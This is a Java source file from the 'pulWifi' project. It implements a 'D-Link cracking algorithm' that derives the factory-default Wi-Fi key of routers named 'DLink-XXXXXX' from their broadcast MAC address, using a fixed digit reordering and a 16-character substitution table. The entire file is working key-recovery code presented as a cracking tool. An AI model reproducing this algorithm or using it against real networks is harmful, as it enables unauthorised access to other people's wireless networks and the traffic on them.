/*
 *  pulWifi , Copyright (C) 2011-2012 Javi Pulido / Antonio V�zquez
 *
 *  This file is part of "pulWifi"
 *
 *  "pulWifi" is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  "pulWifi" is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with "pulWifi".  If not, see <http://www.gnu.org/licenses/>.
 */

package es.pulimento.wifi.core.algorithms;

import java.util.Locale;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * D-Link cracking algorithm.
 * Cracks all networks with "Dlink-XXXXXX" as name.
 * I have no information about what type of encryption does it support.
 */
public class DlinkAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public DlinkAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected void setPatterns() {

		// ESSID: Dlink-XXXXXX
		// BSSID: Any
		addPattern("DLink-([0-9a-fA-F]{6})", "([0-9A-Fa-f:]{17})");
	}

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		// Delete dots from bssid and use caps only...
		bssid_data = bssid_data.replace(":", "").toUpperCase(Locale.getDefault());

		// Select inportant data from bssid...
		char[] data = new char[20];
		data[0] = bssid_data.charAt(11);
		data[1] = bssid_data.charAt(0);
		data[2] = bssid_data.charAt(10);
		data[3] = bssid_data.charAt(1);
		data[4] = bssid_data.charAt(9);
		data[5] = bssid_data.charAt(2);
		data[6] = bssid_data.charAt(8);
		data[7] = bssid_data.charAt(3);
		data[8] = bssid_data.charAt(7);
		data[9] = bssid_data.charAt(4);
		data[10] = bssid_data.charAt(6);
		data[11] = bssid_data.charAt(5);
		data[12] = bssid_data.charAt(1);
		data[13] = bssid_data.charAt(6);
		data[14] = bssid_data.charAt(8);
		data[15] = bssid_data.charAt(9);
		data[16] = bssid_data.charAt(11);
		data[17] = bssid_data.charAt(2);
		data[18] = bssid_data.charAt(4);
		data[19] = bssid_data.charAt(10);

		// Process key throught the real algorithm...
		char[] key = new char[20];
		char hash[] = { 'X', 'r', 'q', 'a', 'H', 'N', 'p', 'd', 'S', 'Y', 'w', '8', '6', '2', '1',
				'5' };
		int index = 0;
		for(int i = 0; i < 20; i++) {
			if((data[i] >= '0') && (data[i] <= '9'))
				index = data[i] - '0';
			else if((data[i] >= 'A') && (data[i] <= 'F'))
				index = data[i] - 'A' + 10;
			else
				// There was an error...
				return null;
			key[i] = hash[index];
		}

		// Return the key...
		return String.valueOf(key, 0, 20);
	}

	/**
	 * {@inheritDoc}
	 */
	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return true;
	}
}